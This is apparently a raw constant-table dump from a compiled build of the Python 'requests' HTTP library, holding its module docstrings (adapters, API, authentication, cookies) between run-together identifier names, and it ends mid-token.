        The SSL related pool key arguments are not consistently set. As of
        this writing, use the following to determine what keys may be in that
        dictionary:

        * If ``verify`` is ``True``, ``"ssl_context"`` will be set and will be the
          default Requests SSL Context
        * If ``verify`` is ``False``, ``"ssl_context"`` will not be set but
          ``"cert_reqs"`` will be set
        * If ``verify`` is a string, (i.e., it is a user-specified trust bundle)
          ``"ca_certs"`` will be set if the string is not a directory recognized
          by :py:func:`os.path.isdir`, otherwise ``"ca_certs_dir"`` will be
          set.
        * If ``"cert"`` is specified, ``"cert_file"`` will always be set. If
          ``"cert"`` is a tuple with a second item, ``"key_file"`` will also
          be present

        To override these settings, one may subclass this class, call this
        method and use the above logic to change parameters as desired. For
        example, if one wishes to use a custom :py:class:`ssl.SSLContext` one
        must both set ``"ssl_context"`` and based on what else they require,
        alter the other keys to ensure the desired behaviour.

        :param request:
            The PreparedReqest being sent over the connection.
        :type request:
            :class:`~requests.models.PreparedRequest`
        :param verify:
            Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use.
        :param cert:
            (optional) Any user-provided SSL certificate for client
            authentication (a.k.a., mTLS). This may be a string (i.e., just
            the path to a file which holds both certificate and key) or a
            tuple of length 2 with the certificate file path and key file
            path.
        :returns:
            A tuple of two dictionaries. The first is the "host parameters"
            portion of the Pool Key including scheme, hostname, and port. The
            second is a dictionary of SSLContext related parameters.
        aselect_proxyabuild_connection_pool_key_attributesaInvalidURLTarequestaprepend_scheme_if_neededahttpaparse_urlaInvalidProxyURLTuPlease check proxy URL. It is malformed and could be missing the host.aproxy_manager_foraconnection_from_hostuReturns a urllib3 connection for the given request and TLS settings.
        This should not be called from user code, and is only exposed for use
        when subclassing the :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param request:
            The :class:`PreparedRequest <PreparedRequest>` object to be sent
            over the connection.
        :param verify:
            Either a boolean, in which case it controls whether we verify the
            server's TLS certificate, or a string, in which case it must be a
            path to a CA bundle to use.
        :param proxies:
            (optional) The proxies dictionary to apply to the request.
        :param cert:
            (optional) Any user-provided SSL certificate to be used for client
            authentication (a.k.a., mTLS).
        :rtype:
            urllib3.ConnectionPool
        awarningsawarnu`get_connection` has been deprecated in favor of `get_connection_with_tls_context`. Custom HTTPAdapter subclasses will need to migrate for Requests>=2.32.2. Please see https://github.com/psf/requests/pull/6710 for more details.aDeprecationWarningaconnection_from_urlageturluDEPRECATED: Users should move to `get_connection_with_tls_context`
        for all subclasses of HTTPAdapter using Requests>=2.32.2.

        Returns a urllib3 connection for the given URL. This should not be
        called from user code, and is only exposed for use when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param url: The URL to connect to.
        :param proxies: (optional) A Requests-style dictionary of proxies used on this request.
        :rtype: urllib3.ConnectionPool
        aclearavaluesuDisposes of any internal state.

        Currently, this closes the PoolManager and any active ProxyManager,
        which closes any pooled connections.
        ahttpsapath_urlTu//w/alstripTw/aurldefragauthuObtain the url to use when making the final request.

        If the message is being sent through a HTTP proxy, the full URL has to
        be used. Otherwise, we should only use the path portion of the URL.

        This should not be called from user code, and is only exposed for use
        when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param proxies: A dictionary of schemes or schemes and hosts to proxy URLs.
        :rtype: str
        a_basic_auth_struProxy-AuthorizationuReturns a dictionary of the headers to add to any request sent
        through a proxy. This works with urllib3 magic to ensure that they are
        correctly sent to the proxy, rather than in a tunnelled request if
        CONNECT is being used.

        This should not be called from user code, and is only exposed for use
        when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param proxy: The url of the proxy being used for this request.
        :rtype: dict
        aget_connection_with_tls_contextTaproxiesacertaLocationValueErroracert_verifyarequest_urlaadd_headersTastreamatimeoutaverifyacertaproxiesabodyuContent-LengthaTimeoutSauceTaconnectareaduInvalid timeout u. Pass a (connect, read) timeout tuple, or a single float to set both timeouts to the same value.aurlopenamethodatimeoutTamethodaurlabodyaheadersaredirectaassert_same_hostapreload_contentadecode_contentaretriesatimeoutachunkedaProtocolErroraConnectionErroraMaxRetryErroraConnectTimeoutErroraNewConnectionErroraConnectTimeoutaResponseErroraRetryErrora_ProxyErroraProxyErrora_SSLErroraSSLErroraClosedPoolErrora_HTTPErroraReadTimeoutErroraReadTimeouta_InvalidHeaderaInvalidHeaderabuild_responseuSends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple or urllib3 Timeout object
        :param verify: (optional) Either a boolean, in which case it controls whether
            we verify the server's TLS certificate, or a string, in which case it
            must be a path to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        :rtype: requests.Response
        u
requests.adapters
~~~~~~~~~~~~~~~~~

This module contains the transport adapters that Requests uses to define
and maintain connections.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uos.pathasocketatypinguurllib3.exceptionsTaClosedPoolErroraConnectTimeoutErrorTaHTTPErroraHTTPErrorTaInvalidHeaderTaLocationValueErroraMaxRetryErroraNewConnectionErroraProtocolErrorTaProxyErrorTaReadTimeoutErroraResponseErrorTaSSLErroruurllib3.poolmanagerTaPoolManageraproxy_from_urluurllib3.utilTaTimeoutaTimeoutTaparse_urluurllib3.util.retryTaRetryuurllib3.util.ssl_Tacreate_urllib3_contextacreate_urllib3_contextaauthTa_basic_auth_stracompatTabasestringaurlparseTaextract_cookies_to_jaraexceptionsT
aConnectionErroraConnectTimeoutaInvalidHeaderaInvalidProxyURLaInvalidSchemaaInvalidURLaProxyErroraReadTimeoutaRetryErroraSSLErroramodelsTaResponseastructuresTaCaseInsensitiveDictautilsTaDEFAULT_CA_BUNDLE_PATHaextract_zipped_pathsaget_auth_from_urlaget_encoding_from_headersaprepend_scheme_if_neededaselect_proxyaurldefragauthaDEFAULT_CA_BUNDLE_PATHaextract_zipped_pathsuurllib3.contrib.socksTaSOCKSProxyManageraDEFAULT_POOLBLOCKl
aDEFAULT_POOLSIZEaDEFAULT_POOL_TIMEOUTasslaload_verify_locationsDarequestaverifyaclient_certapoolmanagerareturnaPreparedRequestubool | str | Noneutyping.Tuple[str, str] | str | NoneaPoolManageru(typing.Dict[str, typing.Any], typing.Dict[str, typing.Any])urequests.adaptersa__module__uThe Base Transport AdapteraBaseAdaptera__qualname__uBaseAdapter.__init__TFntnnasenduBaseAdapter.sendacloseuBaseAdapter.closea__prepare__aHTTPAdaptera__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uThe built-in HTTP Adapter for urllib3.

    Provides a general-case interface for Requests sessions to contact HTTP and
    HTTPS urls by implementing the Transport Adapter interface. This class will
    usually be created by the :class:`Session <Session>` class under the
    covers.

    :param pool_connections: The number of urllib3 connection pools to cache.
    :param pool_maxsize: The maximum number of connections to save in the pool.
    :param max_retries: The maximum number of retries each connection
        should attempt. Note, this applies only to failed DNS lookups, socket
        connections and connection timeouts, never to requests where data has
        made it to the server. By default, Requests does not retry failed
        connections. If you need granular control over the conditions under
        which we retry a request, import urllib3's ``Retry`` class and pass
        that instead.
    :param pool_block: Whether the connection pool should block for connections.

    Usage::

      >>> import requests
      >>> s = requests.Session()
      >>> a = requests.adapters.HTTPAdapter(max_retries=3)
      >>> s.mount('http://', a)
    Lamax_retriesaconfiga_pool_connectionsa_pool_maxsizea_pool_blockuHTTPAdapter.__init__a__getstate__uHTTPAdapter.__getstate__a__setstate__uHTTPAdapter.__setstate__uHTTPAdapter.init_poolmanageruHTTPAdapter.proxy_manager_foruHTTPAdapter.cert_verifyuHTTPAdapter.build_responseTnuHTTPAdapter.build_connection_pool_key_attributesTnnuHTTPAdapter.get_connection_with_tls_contextaget_connectionuHTTPAdapter.get_connectionuHTTPAdapter.closeuHTTPAdapter.request_urluAdd any headers needed by the connection. As of v2.0 this does
        nothing by default, but is left for overriding by users that subclass
        the :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        This should not be called from user code, and is only exposed for use
        when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param request: The :class:`PreparedRequest <PreparedRequest>` to add headers to.
        :param kwargs: The keyword arguments from the call to send().
        uHTTPAdapter.add_headersuHTTPAdapter.proxy_headersuHTTPAdapter.senda__orig_bases__urequests\adapters.pyu<module requests.adapters>Ta__class__TaargsakwargsTaselfTaselfa__class__Taselfapool_connectionsapool_maxsizeamax_retriesapool_blocka__class__TaselfastateaattravalueT
arequestaverifyaclient_certapoolmanagerahost_paramsapool_kwargsaparsed_request_urlaschemeaportapoolmanager_kwargsahas_poolmanager_ssl_contextashould_use_default_ssl_contextacert_reqsTaselfarequestakwargsTaselfarequestaverifyacertTaselfareqaresparesponseTaselfaconnaurlaverifyacertacert_locTaselfaproxyTaselfaurlaproxiesaproxyaproxy_urlaproxy_manageraconnaparsedTaselfarequestaverifyaproxiesacertaproxyahost_paramsapool_kwargsweaproxy_urlaproxy_manageraconnTaselfaconnectionsamaxsizeablockapool_kwargsTaselfaproxyaheadersausernameapasswordTaselfaproxyaproxy_kwargsamanagerausernameapasswordaproxy_headersTaselfarequestaproxiesaproxyaschemeais_proxied_http_requestausing_socks_proxyaproxy_schemeaurlTaselfarequestastreamatimeoutaverifyacertaproxiesTaselfarequestastreamatimeoutaverifyacertaproxiesaconnweaurlachunkedaconnectareadarespaerr.requests.api^/asessionsaSessiona__enter__a__exit__arequestamethodaurlTnnnuConstructs and sends a :class:`Request <Request>`.

    :param method: method for the new :class:`Request` object: ``GET``, ``OPTIONS``, ``HEAD``, ``POST``, ``PUT``, ``PATCH``, or ``DELETE``.
    :param url: URL for the new :class:`Request` object.
    :param params: (optional) Dictionary, list of tuples or bytes to send
        in the query string for the :class:`Request`.
    :param data: (optional) Dictionary, list of tuples, bytes, or file-like
        object to send in the body of the :class:`Request`.
    :param json: (optional) A JSON serializable Python object to send in the body of the :class:`Request`.
    :param headers: (optional) Dictionary of HTTP Headers to send with the :class:`Request`.
    :param cookies: (optional) Dict or CookieJar object to send with the :class:`Request`.
    :param files: (optional) Dictionary of ``'name': file-like-objects`` (or ``{'name': file-tuple}``) for multipart encoding upload.
        ``file-tuple`` can be a 2-tuple ``('filename', fileobj)``, 3-tuple ``('filename', fileobj, 'content_type')``
        or a 4-tuple ``('filename', fileobj, 'content_type', custom_headers)``, where ``'content_type'`` is a string
        defining the content type of the given file and ``custom_headers`` a dict-like object containing additional headers
        to add for the file.
    :param auth: (optional) Auth tuple to enable Basic/Digest/Custom HTTP Auth.
    :param timeout: (optional) How many seconds to wait for the server to send data
        before giving up, as a float, or a :ref:`(connect timeout, read
        timeout) <timeouts>` tuple.
    :type timeout: float or tuple
    :param allow_redirects: (optional) Boolean. Enable/disable GET/OPTIONS/POST/PUT/PATCH/DELETE/HEAD redirection. Defaults to ``True``.
    :type allow_redirects: bool
    :param proxies: (optional) Dictionary mapping protocol to the URL of the proxy.
    :param verify: (optional) Either a boolean, in which case it controls whether we verify
            the server's TLS certificate, or a string, in which case it must be a path
            to a CA bundle to use. Defaults to ``True``.
    :param stream: (optional) if ``False``, the response content will be immediately downloaded.
    :param cert: (optional) if String, path to ssl client cert file (.pem). If Tuple, ('cert', 'key') pair.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response

    Usage::

      >>> import requests
      >>> req = requests.request('GET', 'https://httpbin.org/get')
      >>> req
      <Response [200]>
    agetaparamsuSends a GET request.

    :param url: URL for the new :class:`Request` object.
    :param params: (optional) Dictionary, list of tuples or bytes to send
        in the query string for the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    aoptionsuSends an OPTIONS request.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    aallow_redirectsaheaduSends a HEAD request.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes. If
        `allow_redirects` is not provided, it will be set to `False` (as
        opposed to the default :meth:`request` behavior).
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    apostadataajsonuSends a POST request.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, list of tuples, bytes, or file-like
        object to send in the body of the :class:`Request`.
    :param json: (optional) A JSON serializable Python object to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    aputuSends a PUT request.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, list of tuples, bytes, or file-like
        object to send in the body of the :class:`Request`.
    :param json: (optional) A JSON serializable Python object to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    apatchuSends a PATCH request.

    :param url: URL for the new :class:`Request` object.
    :param data: (optional) Dictionary, list of tuples, bytes, or file-like
        object to send in the body of the :class:`Request`.
    :param json: (optional) A JSON serializable Python object to send in the body of the :class:`Request`.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    adeleteuSends a DELETE request.

    :param url: URL for the new :class:`Request` object.
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    u
requests.api
~~~~~~~~~~~~

This module implements the Requests API.

:copyright: (c) 2012 by Kenneth Reitz.
:license: Apache2, see LICENSE for more details.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uTasessionsllTnTnnurequests\api.pyu<module requests.api>TaurlakwargsTaurlaparamsakwargsTaurladataakwargsTaurladataajsonakwargsTamethodaurlakwargsasession.requests.authabasestringawarningsawarnuNon-string usernames will no longer be supported in Requests 3.0.0. Please convert the object you've passed in ({!r}) to a string or bytes object in the near future to avoid problems.aDeprecationWarningTacategoryastruNon-string passwords will no longer be supported in Requests 3.0.0. Please convert the object you've passed in ({!r}) to a string or bytes object in the near future to avoid problems.aencodeTalatin1uBasic ato_native_stringab64encoded:astripuReturns a Basic Auth string.uAuth hooks must be callable.ausernameapassworda_basic_auth_straheadersaAuthorizationuProxy-Authorizationathreadingalocala_thread_localainitualast_noncelanonce_countachalaposanum_401_callsarealmanonceagetTaqopTaalgorithmTaopaqueaMD5aupperuMD5-SESSamd5_utf8uHTTPDigestAuth.build_digest_header.<locals>.md5_utf8aSHAasha_utf8uHTTPDigestAuth.build_digest_header.<locals>.sha_utf8uSHA-256asha256_utf8uHTTPDigestAuth.build_digest_header.<locals>.sha256_utf8uSHA-512asha512_utf8uHTTPDigestAuth.build_digest_header.<locals>.sha512_utf8u<lambda>uHTTPDigestAuth.build_digest_header.<locals>.<lambda>aurlparseapathw/aqueryw?w:lu08xTuutf-8atimeactimeaurandomTlahashlibasha1ahexdigest:nlnaauthasplitTw,u:auth:uusername="u", realm="u", nonce="u", uri="u", response="w"u, opaque="u, algorithm="u, qop="auth", nc=u, cnonce="uDigest u
        :rtype: str
        amd5asha256asha512ahash_utf8ais_redirectuReset num_401_calls counter on redirects.astatus_codellarequestabodyaseekTuwww-authenticateuadigestalowerlareacompileaIGNORECASETudigest Taflagsaparse_dict_headerasubDacountlacontentacloseacopyaextract_cookies_to_jara_cookiesarawaprepare_cookiesabuild_digest_headeramethodaurlaconnectionasendahistoryaappendu
        Takes the given response and tries digest-auth, if needed.

        :rtype: requests.Response
        ainit_per_thread_stateatellaregister_hookaresponseahandle_401ahandle_redirectu
requests.auth
~~~~~~~~~~~~~

This module contains the authentication handlers for Requests.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aosabase64Tab64encodea_internal_utilsTato_native_stringacompatTabasestringastraurlparseacookiesTaextract_cookies_to_jarautilsTaparse_dict_headeruapplication/x-www-form-urlencodedaCONTENT_TYPE_FORM_URLENCODEDumultipart/form-dataaCONTENT_TYPE_MULTI_PARTurequests.autha__module__uBase class that all auth implementations derive fromaAuthBasea__qualname__a__call__uAuthBase.__call__a__prepare__aHTTPBasicAutha__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uAttaches HTTP Basic Authentication to the given Request object.a__init__uHTTPBasicAuth.__init__a__eq__uHTTPBasicAuth.__eq__a__ne__uHTTPBasicAuth.__ne__uHTTPBasicAuth.__call__a__orig_bases__aHTTPProxyAuthuAttaches HTTP Proxy Authentication to a given Request object.uHTTPProxyAuth.__call__aHTTPDigestAuthuAttaches HTTP Digest Authentication to the given Request object.uHTTPDigestAuth.__init__uHTTPDigestAuth.init_per_thread_stateuHTTPDigestAuth.build_digest_headeruHTTPDigestAuth.handle_redirectuHTTPDigestAuth.handle_401uHTTPDigestAuth.__call__uHTTPDigestAuth.__eq__uHTTPDigestAuth.__ne__urequests\auth.pyTwswdahash_utf8Tahash_utf8u<module requests.auth>Ta__class__TaselfwrTaselfaotherTaselfausernameapasswordTausernameapasswordaauthstrTaselfamethodaurlarealmanonceaqopaalgorithmaopaqueahash_utf8a_algorithmamd5_utf8asha_utf8asha256_utf8asha512_utf8aKDaentdigap_parsedapathaA1aA2aHA1aHA2ancvaluewsacnoncearespdiganoncebitabaseTaselfwrakwargsas_authapataprepa_rTaselfwrakwargsTaselfTwx.requests.certsu
requests.certs
~~~~~~~~~~~~~~

This module returns the preferred default CA certificate bundle. There is
only one — the one from the certifi package.

If you are packaging Requests, e.g., for a Linux distribution or a managed
environment, you can change the definition of where() to return a separately
packaged CA bundle.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__acertifiTawherelawhereurequests\certs.pyu<module requests.certs>u.requests.compat
FTachardetacharset_normalizerachardetaimport_moduleuFind supported character detection libraries.u
requests.compat
~~~~~~~~~~~~~~~

This module previously handled import compatibility issues
between Python 2 and Python 3. It remains for backwards
compatibility until the next major version.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aimportlibasysa_resolve_char_detectiona_verais_py2ais_py3ahas_simplejsonasimplejsonlajsonTaJSONDecodeErroraJSONDecodeErroracollectionsTaOrderedDictaOrderedDictucollections.abcTaCallableaMappingaMutableMappingaCallableaMappingaMutableMappingahttpTacookiejaracookiejaracookielibuhttp.cookiesTaMorselaMorselaStringIOuurllib.parseT
aquoteaquote_plusaunquoteaunquote_plusaurldefragaurlencodeaurljoinaurlparseaurlsplitaurlunparseaquoteaquote_plusaunquoteaunquote_plusaurldefragaurlencodeaurljoinaurlparseaurlsplitaurlunparseuurllib.requestTagetproxiesagetproxies_environmentaparse_http_listaproxy_bypassaproxy_bypass_environmentagetproxiesagetproxies_environmentaparse_http_listaproxy_bypassaproxy_bypass_environmentastrabuiltin_strabytesabasestringTOintOfloatanumeric_typesTOintainteger_typesurequests\compat.pyu<module requests.compat>Tachardetalibu.requests&wasplitTw.adevaappendTw0utoo many values to unpack (expected 3)ll:nlnTlllTllpTllpTllpawarningsawarnuUnable to find acceptable character detection dependency (chardet or charset_normalizer).aRequestsDependencyWarninglluOld version of cryptography ({}) may cause slowdown.u
Requests HTTP Library
~~~~~~~~~~~~~~~~~~~~~

Requests is an HTTP library, written in Python, for human beings.
Basic GET usage:

   >>> import requests
   >>> r = requests.get('https://www.python.org')
   >>> r.status_code
   200
   >>> b'Python is a programming language' in r.content
   True

... or POST:

   >>> payload = dict(key1='value1', key2='value2')
   >>> r = requests.post('https://httpbin.org/post', data=payload)
   >>> print(r.text)
   {
     ...
     "form": {
       "key1": "value1",
       "key2": "value2"
     },
     ...
   }

The other HTTP methods are supported - see `requests.api`. Full documentation
is at <https://requests.readthedocs.io>.

:copyright: (c) 2017 by Kenneth Reitz.
:license: Apache 2.0, see LICENSE for more details.
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_requestsu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__laurllib3aexceptionsTaRequestsDependencyWarningacharset_normalizerTa__version__a__version__acharset_normalizer_versionachardetachardet_versionacheck_compatibilitya_check_cryptographyTEAssertionErrorEValueErroruurllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported version!asslaHAS_SNIuurllib3.contribTapyopensslapyopensslainject_into_urllib3acryptographyacryptography_versionuurllib3.exceptionsTaDependencyWarningaDependencyWarningasimplefilteraignorealoggingTaNullHandleraNullHandleruTapackagesautilsapackagesautilsT
a__author__a__author_email__a__build__a__cake__a__copyright__a__description__a__license__a__title__a__url__a__version__a__author__a__author_email__a__build__a__cake__a__copyright__a__description__a__license__a__title__a__url__aapiTadeleteagetaheadaoptionsapatchapostaputarequestadeleteaheadaoptionsapatchapostaputarequestT
aConnectionErroraConnectTimeoutaFileModeWarningaHTTPErroraJSONDecodeErroraReadTimeoutaRequestExceptionaTimeoutaTooManyRedirectsaURLRequiredaConnectionErroraConnectTimeoutaFileModeWarningaHTTPErroraJSONDecodeErroraReadTimeoutaRequestExceptionaTimeoutaTooManyRedirectsaURLRequiredamodelsTaPreparedRequestaRequestaResponseaPreparedRequestaRequestaResponseasessionsTaSessionasessionaSessionasessionastatus_codesTacodesacodesagetLoggerTarequestsaaddHandleradefaultDaappendturequests\__init__.pyu<module requests>Tacryptography_versionawarningTaurllib3_versionachardet_versionacharset_normalizer_versionamajoraminorapatch.requests.cookiesR+a_ra_new_headersaurlparseaurlaschemeatypeanetlocaget_hostaheadersagetTaHostato_native_stringaHostDaencodinguutf-8aurlunparseapathaparamsaqueryafragmentuCookie headers should be added with add_unredirected_header()ucookiejar has no legitimate use for this method; add it back if you find one.ais_unverifiableaget_origin_req_hosta_headersuMake a MockResponse for `cookiejar` to read.

        :param headers: a httplib.HTTPMessage or analogous carrying the headers
        agetheadersa_original_responseaMockRequestaMockResponseamsgaextract_cookiesuExtract the cookies from the response into a CookieJar.

    :param jar: http.cookiejar.CookieJar (not necessarily a RequestsCookieJar)
    :param request: our own requests.Request object
    :param response: urllib3.HTTPResponse object
    aadd_cookie_headeraget_new_headersTaCookieu
    Produce an appropriate Cookie header string to be sent with `request`, or None.

    :rtype: str
    anameadomainaclearablesutoo many values to unpack (expected 3)acookiejaraclearuUnsets a cookie by name, by default over all domains and paths.

    Wraps CookieJar.clear(), is O(n).
    a_find_no_duplicatesuDict-like get() that also supports optional domain and path args in
        order to resolve naming collisions from using one cookie jar over
        multiple domains.

        .. warning:: operation is O(n), not O(1).
        aremove_cookie_by_nameTadomainapathaMorselamorsel_to_cookieacreate_cookieaset_cookieuDict-like set() that also supports optional domain and path args in
        order to resolve naming collisions from using one cookie jar over
        multiple domains.
        uDict-like iterkeys() that returns an iterator of names of cookies
        from the jar.

        .. seealso:: itervalues() and iteritems().
        aselfaiterkeysuRequestsCookieJar.iterkeysuDict-like keys() that returns a list of names of cookies from the
        jar.

        .. seealso:: values() and items().
        uDict-like itervalues() that returns an iterator of values of cookies
        from the jar.

        .. seealso:: iterkeys() and iteritems().
        avalueaitervaluesuRequestsCookieJar.itervaluesuDict-like values() that returns a list of values of cookies from the
        jar.

        .. seealso:: keys() and items().
        uDict-like iteritems() that returns an iterator of name-value tuples
        from the jar.

        .. seealso:: iterkeys() and itervalues().
        aiteritemsuRequestsCookieJar.iteritemsuDict-like items() that returns a list of name-value tuples from the
        jar. Allows client-code to call ``dict(RequestsCookieJar)`` and get a
        vanilla python dict of key value pairs.

        .. seealso:: keys() and values().
        adomainsuUtility method to list all the domains in the jar.apathsuUtility method to list all the paths in the jar.uReturns True if there are multiple domains in the jar.
        Returns False otherwise.

        :rtype: bool
        adictionaryuTakes as an argument an optional domain and path and returns a plain
        old Python dict of name-value pairs of cookies that meet the
        requirements.

        :rtype: dict
        a__class__a__contains__aCookieConflictErroruDict-like __getitem__() for compatibility with client code. Throws
        exception if there are more than one cookie with name. In that case,
        use the more explicit get() method instead.

        .. warning:: operation is O(n), not O(1).
        asetuDict-like __setitem__ for compatibility with client code. Throws
        exception if there is already a cookie of that name in the jar. In that
        case, use the more explicit set() method instead.
        uDeletes a cookie given a name. Wraps ``http.cookiejar.CookieJar``'s
        ``remove_cookie_by_name()``.
        astartswithTw"aendswithareplaceTu\"uacookielibaCookieJaracopyaupdateuUpdates this jar with cookies from another CookieJar or dict-likeuname=uu, domain=u, path=uRequests uses this method internally to get cookie values.

        If there are conflicting cookies, _find arbitrarily chooses one.
        See _find_no_duplicates if you want an exception thrown if there are
        conflicting cookies.

        :param name: a string containing name of cookie
        :param domain: (optional) string containing domain of cookie
        :param path: (optional) string containing path of cookie
        :return: cookie.value
        atoReturnuThere are multiple cookies with name, uBoth ``__get_item__`` and ``get`` call this function: it's never
        used elsewhere in Requests.

        :param name: a string containing name of cookie
        :param domain: (optional) string containing domain of cookie
        :param path: (optional) string containing path of cookie
        :raises KeyError: if cookie is not found
        :raises CookieConflictError: if there are multiple cookies
            that match name and optionally domain and path
        :return: cookie.value
        apopTa_cookies_lockuUnlike a normal CookieJar, this class is pickleable.a_cookies_lockathreadingaRLockaRequestsCookieJaraset_policyaget_policyuReturn a copy of this RequestsCookieJar.a_policyuReturn the CookiePolicy instance used.anew_jaraversionlaportw/asecureaexpiresadiscardacommentacomment_urlarestDaHttpOnlynarfc2109ucreate_cookie() got unexpected keyword arguments: aport_specifiedadomain_specifiedTw.adomain_initial_dotapath_specifiedaCookieuMake a cookie from underspecified parameters.

    By default, the pair of `name` and `value` will be set for the domain ''
    and sent on every request (this is sometimes called a "supercookie").
    umax-ageatimeumax-age: u must be integeracalendaratimegmastrptimeu%a, %d-%b-%Y %H:%M:%S GMTakeyaHttpOnlyahttponlyT
acommentacomment_urladiscardadomainaexpiresanameapathaportarestarfc2109asecureavalueaversionuConvert a Morsel object into a Cookie containing the one k/v pair.uReturns a CookieJar from a key/value dictionary.

    :param cookie_dict: Dict of key/values to insert into CookieJar.
    :param cookiejar: (optional) A cookiejar to add the cookies to.
    :param overwrite: (optional) If False, will not replace cookies
        already in the jar with new ones.
    :rtype: CookieJar
    uYou can only merge into CookieJaracookiejar_from_dictTacookiejaraoverwriteuAdd cookies to cookiejar and returns a merged CookieJar.

    :param cookiejar: CookieJar object to add the cookies to.
    :param cookies: Dictionary or CookieJar object to be added.
    :rtype: CookieJar
    u
requests.cookies
~~~~~~~~~~~~~~~~

Compatibility code to be able to use `http.cookiejar.CookieJar` with requests.

requests.utils imports from here, so be careful with imports.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__a_internal_utilsTato_native_stringlacompatTaMorselaMutableMappingacookielibaurlparseaurlunparseaMutableMappingadummy_threadingurequests.cookiesa__module__uWraps a `requests.Request` to mimic a `urllib2.Request`.

    The code in `http.cookiejar.CookieJar` expects this interface in order to correctly
    manage cookie policies, i.e., determine whether a cookie can be set, given the
    domains of the request and the cookie.

    The original request object is read-only. The client is responsible for collecting
    the new headers via `get_new_headers()` and interpreting them appropriately. You
    probably want `get_cookie_header`, defined below.
    a__qualname__a__init__uMockRequest.__init__aget_typeuMockRequest.get_typeuMockRequest.get_hostuMockRequest.get_origin_req_hostaget_full_urluMockRequest.get_full_urluMockRequest.is_unverifiableahas_headeruMockRequest.has_headerTnaget_headeruMockRequest.get_headeraadd_headeruMockRequest.add_headeraadd_unredirected_headeruMockRequest.add_unredirected_headeruMockRequest.get_new_headersaunverifiableuMockRequest.unverifiableaorigin_req_hostuMockRequest.origin_req_hostahostuMockRequest.hostuWraps a `httplib.HTTPMessage` to mimic a `urllib.addinfourl`.

    ...what? Basically, expose the parsed HTTP headers from the server response
    the way `http.cookiejar` expects to see them.
    uMockResponse.__init__ainfouMockResponse.infouMockResponse.getheadersaextract_cookies_to_jaraget_cookie_headerTnnTERuntimeErrora__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uThere are two cookies that meet the criteria specified in the cookie jar.
    Use .get and .set and include domain and path args in order to be more specific.
    a__orig_bases__uCompatibility class; is a http.cookiejar.CookieJar, but exposes a dict
    interface.

    This is the CookieJar we create by default for requests and sessions that
    don't specify one, since some clients may expect response.cookies and
    session.cookies to support dict operations.

    Requests does not use the dict interface internally; it's just for
    compatibility with external client code. All requests code should work
    out of the box with externally provided instances of ``CookieJar``, e.g.
    ``LWPCookieJar`` and ``FileCookieJar``.

    Unlike a regular CookieJar, this class is pickleable.

    .. warning:: dictionary operations that are normally O(1) may be O(n).
    TnnnuRequestsCookieJar.getuRequestsCookieJar.setakeysuRequestsCookieJar.keysavaluesuRequestsCookieJar.valuesaitemsuRequestsCookieJar.itemsalist_domainsuRequestsCookieJar.list_domainsalist_pathsuRequestsCookieJar.list_pathsamultiple_domainsuRequestsCookieJar.multiple_domainsaget_dictuRequestsCookieJar.get_dictuRequestsCookieJar.__contains__uRequestsCookieJar.__getitem__a__setitem__uRequestsCookieJar.__setitem__a__delitem__uRequestsCookieJar.__delitem__uRequestsCookieJar.set_cookieuRequestsCookieJar.updatea_finduRequestsCookieJar._finduRequestsCookieJar._find_no_duplicatesa__getstate__uRequestsCookieJar.__getstate__a__setstate__uRequestsCookieJar.__setstate__uRequestsCookieJar.copyuRequestsCookieJar.get_policya_copy_cookie_jarTntamerge_cookiesurequests\cookies.pyu<module 